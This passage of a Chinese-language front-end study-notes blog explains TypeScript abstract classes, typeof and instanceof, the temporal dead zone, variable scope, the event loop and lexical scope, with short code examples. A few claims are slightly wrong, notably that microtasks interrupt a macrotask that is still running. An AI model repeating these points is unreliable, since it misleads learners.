<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br>  <span class="hljs-keyword">abstract</span> <span class="hljs-title function_">makeSound</span>(): <span class="hljs-built_in">void</span>;<br>  <span class="hljs-title function_">move</span>(): <span class="hljs-built_in">void</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Moving...&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在上面的示例中，<code>Animal</code> 是一个抽象类，它包含一个抽象方法 <code>makeSound</code> 和一个具体方法 <code>move</code>。</p>
<p><strong>定义抽象方法：</strong> 抽象方法是在抽象类中声明但没有提供实际实现的方法。抽象方法使用 <code>abstract</code> 关键字标记，并且没有方法体：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br>  <span class="hljs-keyword">abstract</span> <span class="hljs-title function_">makeSound</span>(): <span class="hljs-built_in">void</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>子类必须实现抽象方法，否则它们也必须被声明为抽象类。</p>
<p><strong>继承抽象类：</strong> 子类可以继承抽象类，并且必须实现抽象方法。例如，如果我们有一个 <code>Dog</code> 类继承自 <code>Animal</code>：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> &#123;<br>  <span class="hljs-title function_">makeSound</span>(): <span class="hljs-built_in">void</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Woof! Woof!&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在上面的示例中，<code>Dog</code> 类继承了 <code>Animal</code> 类并实现了抽象方法 <code>makeSound</code>。</p>
<p><strong>创建实例：</strong> 您可以创建子类的实例，但不能创建抽象类的实例。例如：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> myDog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();<br>myDog.<span class="hljs-title function_">makeSound</span>(); <span class="hljs-comment">// 输出: Woof! Woof!</span><br>myDog.<span class="hljs-title function_">move</span>();      <span class="hljs-comment">// 输出: Moving...</span><br></code></pre></td></tr></table></figure>

<p>注意，抽象类的抽象方法必须在子类中被实现，否则 TypeScript 编译器会产生错误。抽象类和抽象方法是用于定义类的结构和规范，以确保派生类满足指定的接口和行为。这在大型应用程序中非常有用，因为它可以帮助您确保代码的一致性和可维护性。</p>
<h3 id="16、typeof和instancesof"><a href="#16、typeof和instancesof" class="headerlink" title="16、typeof和instancesof"></a>16、typeof和instancesof</h3><h5 id="介绍一下typeof用法"><a href="#介绍一下typeof用法" class="headerlink" title="介绍一下typeof用法"></a>介绍一下typeof用法</h5><p><code>typeof</code> 是JavaScript中的一个操作符，用于获取一个值的数据类型。它通常以如下的方式使用：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> value<br></code></pre></td></tr></table></figure>

<p>其中，<code>value</code> 是你想要获取其数据类型的值。<code>typeof</code> 操作符返回一个字符串，表示值的数据类型，可能的结果包括以下几种：</p>
<ol>
<li><code>&quot;undefined&quot;</code>：表示值是未定义的。</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> <span class="hljs-literal">undefined</span>; <span class="hljs-comment">// &quot;undefined&quot;</span><br></code></pre></td></tr></table></figure>

<ol start="2">
<li><code>&quot;boolean&quot;</code>：表示值是布尔类型。</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// &quot;boolean&quot;</span><br></code></pre></td></tr></table></figure>

<ol start="3">
<li><code>&quot;number&quot;</code>：表示值是数值类型，包括整数和浮点数。</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> <span class="hljs-number">42</span>; <span class="hljs-comment">// &quot;number&quot;</span><br></code></pre></td></tr></table></figure>

<ol start="4">
<li><code>&quot;string&quot;</code>：表示值是字符串类型。</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> <span class="hljs-string">&quot;Hello&quot;</span>; <span class="hljs-comment">// &quot;string&quot;</span><br></code></pre></td></tr></table></figure>

<ol start="5">
<li><code>&quot;object&quot;</code>：表示值是对象，包括对象、数组、函数等。</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> &#123;&#125;; <span class="hljs-comment">// &quot;object&quot;</span><br><span class="hljs-keyword">typeof</span> []; <span class="hljs-comment">// &quot;object&quot;</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;; <span class="hljs-comment">// &quot;function&quot;</span><br></code></pre></td></tr></table></figure>

<ol start="6">
<li><code>&quot;symbol&quot;</code>：表示值是符号类型（ES6新增）。</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&quot;mySymbol&quot;</span>); <span class="hljs-comment">// &quot;symbol&quot;</span><br></code></pre></td></tr></table></figure>

<ol start="7">
<li><code>&quot;bigint&quot;</code>：表示值是大整数类型（ES11新增）。</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> <span class="hljs-number">1234567890123456789012345678901234567890n</span>; <span class="hljs-comment">// &quot;bigint&quot;</span><br></code></pre></td></tr></table></figure>

<ol start="8">
<li><code>&quot;function&quot;</code>：表示值是函数类型。</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">console</span>.<span class="hljs-property">log</span>; <span class="hljs-comment">// &quot;function&quot;</span><br></code></pre></td></tr></table></figure>

<p>需要注意的是，<code>typeof</code> 对于大多数值都能够返回正确的数据类型，但它存在一些特殊情况和限制，例如：</p>
<ul>
<li>对于<code>null</code>，<code>typeof</code> 会返回 <code>&quot;object&quot;</code>，这是一个历史遗留问题。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// &quot;object&quot;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>对于引用类型（如数组和对象），<code>typeof</code> 会返回 <code>&quot;object&quot;</code>，但它不能进一步区分不同的引用类型。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> []; <span class="hljs-comment">// &quot;object&quot;</span><br><span class="hljs-keyword">typeof</span> &#123;&#125;; <span class="hljs-comment">// &quot;object&quot;</span><br></code></pre></td></tr></table></figure>

<p>因此，要更精确地判断值的数据类型，可以考虑使用其他方法，如<code>instanceof</code> 运算符或检查对象的构造函数属性。</p>
<h5 id="instanceof-原理"><a href="#instanceof-原理" class="headerlink" title="instanceof 原理"></a>instanceof 原理</h5><p><code>instanceof</code> 是 JavaScript 中的一个运算符，用于检查对象是否是某个构造函数的实例。其原理可以简单概括如下：</p>
<ol>
<li><p><code>instanceof</code> 运算符首先检查对象的原型链（<code>__proto__</code>）上是否存在构造函数的 <code>prototype</code> 属性。原型链是一条由对象链接而成的链，每个对象都有一个 <code>__proto__</code> 属性指向其原型对象。</p>
</li>
<li><p>如果在原型链中找到了构造函数的 <code>prototype</code> 属性，且它与对象的原型链上的某个对象相匹配，那么 <code>instanceof</code> 返回 <code>true</code>，表示对象是该构造函数的实例。</p>
</li>
<li><p>如果在原型链上未找到匹配的 <code>prototype</code> 属性，<code>instanceof</code> 返回 <code>false</code>，表示对象不是该构造函数的实例。</p>
</li>
</ol>
<p>下面是一个示例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>) &#123;&#125;<br><br><span class="hljs-keyword">var</span> personObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(personObj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// 输出 true</span><br></code></pre></td></tr></table></figure>

<p>在这个示例中，<code>personObj</code> 是通过 <code>new Person()</code> 创建的一个对象。<code>instanceof</code> 运算符检查 <code>personObj</code> 的原型链，发现 <code>Person.prototype</code> 存在于原型链上，因此返回 <code>true</code>。</p>
<p>需要注意的是，<code>instanceof</code> 运算符检查的是原型链，所以如果对象的原型链中有多层继承关系，且其中某一层原型链上存在构造函数的 <code>prototype</code> 属性，也会返回 <code>true</code>。但如果构造函数的 <code>prototype</code> 属性被改变，或者对象的原型链被修改，<code>instanceof</code> 的结果可能不符合预期。因此，在实际开发中，建议谨慎使用 <code>instanceof</code>，并且结合其他方式来进行类型检查，例如 <code>Object.prototype.toString.call(obj)</code>。</p>
<h5 id="typeof和instanceof的区别"><a href="#typeof和instanceof的区别" class="headerlink" title="typeof和instanceof的区别"></a>typeof和instanceof的区别</h5><p><code>typeof</code> 和 <code>instanceof</code> 是 JavaScript 中两个不同的操作符，用于检查变量的类型或对象的原型链关系。它们之间的区别如下：</p>
<ol>
<li><p><strong>typeof：</strong></p>
<ul>
<li><code>typeof</code> 是一个操作符，用于检查变量的数据类型。</li>
<li>它返回一个表示数据类型的字符串，例如：”string”、”number”、”boolean”、”undefined”、”object”、”function” 等。</li>
<li><code>typeof</code> 对于原始数据类型（如字符串、数字、布尔值、undefined）以及函数都能够较好地工作。但对于复杂对象（如数组、日期、正则表达式等），它返回的都是 “object”。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> <span class="hljs-string">&quot;Hello&quot;</span>; <span class="hljs-comment">// &quot;string&quot;</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-number">42</span>; <span class="hljs-comment">// &quot;number&quot;</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// &quot;boolean&quot;</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-literal">undefined</span>; <span class="hljs-comment">// &quot;undefined&quot;</span><br><span class="hljs-keyword">typeof</span> &#123;&#125;; <span class="hljs-comment">// &quot;object&quot;</span><br><span class="hljs-keyword">typeof</span> []; <span class="hljs-comment">// &quot;object&quot;</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;; <span class="hljs-comment">// &quot;function&quot;</span><br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>instanceof：</strong></p>
<ul>
<li><code>instanceof</code> 是一个操作符，用于检查对象是否是特定类的实例（或其原型链上的实例）。</li>
<li>它返回一个布尔值，如果对象是指定类的实例，则返回 <code>true</code>，否则返回 <code>false</code>。</li>
<li><code>instanceof</code> 主要用于检查对象是否属于自定义类或构造函数的实例，通常用于检查继承关系。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> arr = [];<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>); <span class="hljs-comment">// true</span><br><br><span class="hljs-keyword">const</span> today = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(today <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Date</span>); <span class="hljs-comment">// true</span><br><br><span class="hljs-keyword">const</span> regex = <span class="hljs-regexp">/abc/</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(regex <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">RegExp</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure></li>
</ol>
<p>总结：</p>
<ul>
<li><code>typeof</code> 主要用于检查数据类型，对于原始数据类型和函数较为有效，但对于复杂对象类型的区分不够明确。</li>
<li><code>instanceof</code> 主要用于检查对象的原型链关系，用于检查对象是否是某个类的实例，更适用于自定义类或构造函数的检查。</li>
</ul>
<h3 id="x3D-x3D-17、const-var问题-暂时性死区-x3D-x3D"><a href="#x3D-x3D-17、const-var问题-暂时性死区-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;17、const var问题 暂时性死区&#x3D;&#x3D;"></a>&#x3D;&#x3D;17、const var问题 暂时性死区&#x3D;&#x3D;</h3><p>“暂时性死区”（Temporal Dead Zone，简称 TDZ）是指在 JavaScript 中，在某些情况下，变量在声明之前是不可访问的，并且会导致在访问这些变量时抛出 ReferenceError 错误（Cannot access ‘a’ before initialization）。这个现象通常出现在使用 <code>let</code> 和 <code>const</code> 声明变量时，而不是 <code>var</code>。</p>
<p>具体来说，暂时性死区发生在以下情况下：</p>
<ol>
<li><p><strong>变量在块级作用域内被声明：</strong> 当一个变量在块级作用域（如 <code>&#123;&#125;</code> 内）中使用 <code>let</code> 或 <code>const</code> 声明时，它只能在声明之后的代码中访问。在声明之前访问这个变量会导致暂时性死区。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(x); <span class="hljs-comment">// ReferenceError: Cannot access &#x27;x&#x27; before initialization</span><br>  <span class="hljs-keyword">let</span> x = <span class="hljs-number">10</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>变量在函数内部被声明：</strong> 同样地，如果一个变量在函数内部使用 <code>let</code> 或 <code>const</code> 声明，它也只能在声明之后的代码中访问。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">example</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(y); <span class="hljs-comment">// ReferenceError: Cannot access &#x27;y&#x27; before initialization</span><br>  <span class="hljs-keyword">let</span> y = <span class="hljs-number">20</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>变量在全局作用域内被声明：</strong> 即使变量在全局作用域中声明，如果使用 <code>let</code> 或 <code>const</code>，也会存在暂时性死区。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(z); <span class="hljs-comment">// ReferenceError: Cannot access &#x27;z&#x27; before initialization</span><br><span class="hljs-keyword">let</span> z = <span class="hljs-number">30</span>;<br></code></pre></td></tr></table></figure></li>
</ol>
<p>要避免暂时性死区错误，可以在使用变量之前先进行声明和初始化，或者使用 <code>var</code> 关键字，因为 <code>var</code> 声明的变量没有暂时性死区。</p>
<p>暂时性死区的出现是为了增强 JavaScript 中变量的可预测性和安全性，防止意外的行为发生，但也需要开发人员了解和谨慎使用 <code>let</code> 和 <code>const</code>。</p>
<h5 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h5><p>在 JavaScript 中，<code>let</code>、<code>const</code> 和 <code>var</code> 是用于声明变量的关键字，它们具有不同的作用域规则：</p>
<ol>
<li><strong><code>var</code> 的作用域：</strong><ul>
<li><code>var</code> 声明的变量具有函数作用域（function scope）。这意味着它们在声明它们的函数内可见，但在函数外不可见。</li>
<li>如果 <code>var</code> 在函数内部声明，它对整个函数内部都是可见的。</li>
<li>如果 <code>var</code> 在全局范围内声明，它对整个页面或脚本都是可见的。</li>
</ul>
</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">example</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> x = <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-keyword">var</span> y = <span class="hljs-number">20</span>;<br>    &#125;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(x); <span class="hljs-comment">// 10</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(y); <span class="hljs-comment">// 20</span><br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(x); <span class="hljs-comment">// 报错，x 不可见</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(y); <span class="hljs-comment">// 报错，y 不可见</span><br></code></pre></td></tr></table></figure>

<ol start="2">
<li><strong><code>let</code> 的作用域：</strong><ul>
<li><code>let</code> 声明的变量具有块级作用域（block scope）。这意味着它们在包含它们的块（如 <code>&#123;&#125;</code>）内可见，但在块外不可见。</li>
<li>在同一个函数内的不同块中，可以使用不同的 <code>let</code> 声明同名的变量。</li>
</ul>
</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">example</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">let</span> x = <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-keyword">let</span> y = <span class="hljs-number">20</span>;<br>    &#125;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(x); <span class="hljs-comment">// 10</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(y); <span class="hljs-comment">// 报错，y 不可见</span><br>&#125;<br></code></pre></td></tr></table></figure>

<ol start="3">
<li><strong><code>const</code> 的作用域：</strong><ul>
<li><code>const</code> 声明的变量也具有块级作用域，并且具有与 <code>let</code> 相同的作用域规则。</li>
<li>与 <code>let</code> 不同的是，<code>const</code> 声明的变量必须立即初始化，并且不能再次赋值。</li>
</ul>
</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">example</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> x = <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-keyword">const</span> y = <span class="hljs-number">20</span>;<br>    &#125;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(x); <span class="hljs-comment">// 10</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(y); <span class="hljs-comment">// 报错，y 不可见</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>总结：</p>
<ul>
<li>使用 <code>var</code> 声明的变量具有函数作用域，对整个函数可见。</li>
<li>使用 <code>let</code> 和 <code>const</code> 声明的变量具有块级作用域，对包含它们的块可见。</li>
<li><code>const</code> 声明的变量必须初始化，并且不能再次赋值。</li>
</ul>
<h3 id="18、事件循环"><a href="#18、事件循环" class="headerlink" title="18、事件循环"></a>18、事件循环</h3><p>事件循环（Event Loop）是前端开发中非常重要的概念之一，它是JavaScript执行和处理异步事件的核心机制之一。事件循环使得JavaScript能够处理用户交互、网络请求、定时器等异步任务，而不会阻塞主线程的执行。</p>
<p>以下是对事件循环的基本了解：</p>
<ol>
<li><p><strong>单线程执行模型：</strong> JavaScript是单线程语言，意味着它在任何给定时刻只能执行一个任务。这个任务通常是执行JavaScript代码，也就是主线程。但JavaScript通常会涉及到一些需要等待的异步操作，如网络请求、定时器、用户输入等，这时就需要事件循环来协调这些异步任务。</p>
</li>
<li><p><strong>任务队列：</strong> 事件循环通过任务队列来管理异步任务。任务队列分为两种：宏任务队列（macrotask queue）和微任务队列（microtask queue）。</p>
<ul>
<li>宏任务队列包括主线程执行的任务（例如执行JavaScript代码、处理DOM事件、定时器等），每个宏任务之间会有一个明确的间隔。</li>
<li>微任务队列用于保存需要尽快执行的任务，例如Promise的回调、<code>MutationObserver</code>的回调等。微任务会在当前宏任务执行完毕后立即执行。</li>
</ul>
</li>
<li><p><strong>事件循环过程：</strong> 事件循环是一个循环迭代的过程，它会不断地从宏任务队列中取出一个宏任务执行，然后检查并执行微任务队列中的所有微任务，然后进入下一个宏任务。这个过程不断重复，直到所有任务都被处理完毕。</p>
<p>具体步骤如下：</p>
<ul>
<li>从宏任务队列中取出一个宏任务。</li>
<li>执行宏任务，包括执行JavaScript代码、处理事件等。</li>
<li>检查微任务队列，执行所有微任务。</li>
<li>返回到第一步，继续下一个宏任务。</li>
</ul>
</li>
<li><p><strong>任务的优先级：</strong> 微任务队列的任务优先级高于宏任务队列，即使宏任务队列中有任务正在执行，也会立即执行微任务队列中的任务。</p>
</li>
<li><p><strong>阻塞主线程的问题：</strong> 由于JavaScript是单线程的，如果某个任务需要很长时间才能完成，它会阻塞主线程的执行，导致界面卡顿。因此，长时间运行的任务通常会被拆分成多个小任务，通过定时器或<code>requestAnimationFrame</code>等机制来实现异步执行，以避免阻塞。</p>
</li>
</ol>
<p>总之，事件循环是JavaScript处理异步任务的关键机制，它确保了JavaScript可以高效地处理各种异步操作，同时保持主线程的响应性。了解事件循环的原理有助于开发者更好地理解和处理异步编程中的各种场景。</p>
<p>JavaScript代码的执行过程中，除了依靠函数调用栈来搞定函数的执行顺序外，还依靠任务队列(task queue)来搞定另外一些代码的执行。整个执行过程，我们称为事件循环过程。一个线程中，事件循环是唯一的，但是任务队列可以拥有多个。任务队列又分为macro-task（宏任务）与micro-task（微任务），在最新标准中，它们被分别称为task与jobs。</p>
<p>macro-task大概包括：</p>
<ul>
<li>script(整体代码)</li>
<li>setTimeout</li>
<li>setInterval</li>
<li>setImmediate</li>
<li>I&#x2F;O</li>
<li>UI render</li>
</ul>
<p>micro-task大概包括:</p>
<ul>
<li>process.nextTick</li>
<li>Promise</li>
<li>Async&#x2F;Await(实际就是promise)</li>
<li>MutationObserver(html5新特性)</li>
</ul>
<p>整体执行：</p>
<img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902184418128-20230902%2018:44:22.png" srcset="/blog/img/loading.gif" lazyload alt="image-20230902184418128" style="zoom:50%;" />

<p>总的结论就是，执行宏任务，然后执行该宏任务产生的微任务，若微任务在执行过程中产生了新的微任务，则继续执行微任务，微任务执行完毕后，再回到宏任务中进行下一轮循环。</p>
<h5 id="事件循环例题"><a href="#事件循环例题" class="headerlink" title="事件循环例题"></a>事件循环例题</h5><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2023-07-23_15-47-35-20230902%2018:36:29.png" srcset="/blog/img/loading.gif" lazyload alt="Snipaste_2023-07-23_15-47-35"></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/364698187">https://zhuanlan.zhihu.com/p/364698187</a></p>
<h3 id="19、词法作用域"><a href="#19、词法作用域" class="headerlink" title="19、词法作用域"></a>19、词法作用域</h3><p>词法作用域（Lexical Scope），也被称为静态作用域，是一种用于确定变量和标识符在代码中查找的规则。词法作用域是在代码编写时确定的，与代码的运行过程无关，因此也被称为静态作用域。这个作用域规则是由代码的结构和嵌套关系决定的，而不是由函数或代码块的执行顺序决定的。</p>
<p>以下是词法作用域的主要特点和原理：</p>
<ol>
<li><p><strong>作用域嵌套：</strong> 在词法作用域中，函数和代码块可以嵌套在其他函数或代码块内部，形成一个层级结构。内部作用域可以访问外部作用域的变量，但外部作用域不能访问内部作用域的变量。</p>
</li>
<li><p><strong>作用域链：</strong> 当在内部作用域中查找变量或标识符时，JavaScript会按照作用域链的顺序从内到外依次查找，直到找到匹配的标识符或到达全局作用域。这个作用域链是根据代码中的嵌套关系建立的。</p>
</li>
<li><p><strong>全局作用域：</strong> 最外层的作用域被称为全局作用域，它包含了整个JavaScript环境中的变量和函数。全局作用域中定义的变量和函数在任何地方都可以访问。</p>
</li>
<li><p><strong>局部作用域：</strong> 在函数内部或代码块内部定义的变量和函数只在其所在的局部作用域中可见，不能在外部作用域中直接访问。</p>
</li>
</ol>
<p>示例代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> globalVar = <span class="hljs-string">&quot;I am global&quot;</span>; <span class="hljs-comment">// 全局作用域</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> outerVar = <span class="hljs-string">&quot;I am outer&quot;</span>; <span class="hljs-comment">// outer函数的局部作用域</span><br>  <br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">inner</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> innerVar = <span class="hljs-string">&quot;I am inner&quot;</span>; <span class="hljs-comment">// inner函数的局部作用域</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(innerVar); <span class="hljs-comment">// 可以访问innerVar</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(outerVar); <span class="hljs-comment">// 可以访问outerVar</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(globalVar); <span class="hljs-comment">// 可以访问globalVar</span><br>  &#125;<br><br>  <span class="hljs-title function_">inner</span>();<br>&#125;<br><br><span class="hljs-title function_">outer</span>();<br></code></pre></td></tr></table></figure>

<p>在上面的示例中，<code>inner</code> 函数可以访问其外部作用域（<code>outer</code> 函数和全局作用域）中的变量，但全局作用域不能访问 <code>inner</code> 函数的局部变量。</p>
<p>词法作用域的静态特性使得在编写和理解代码时能够更容易地确定变量的作用域和访问规则，有助于代码的可读性和可维护性。这与动态作用域不同，动态作用域是在运行时根据调用堆栈来确定变量的作用域。JavaScript采用的是词法作用域机制。</p>
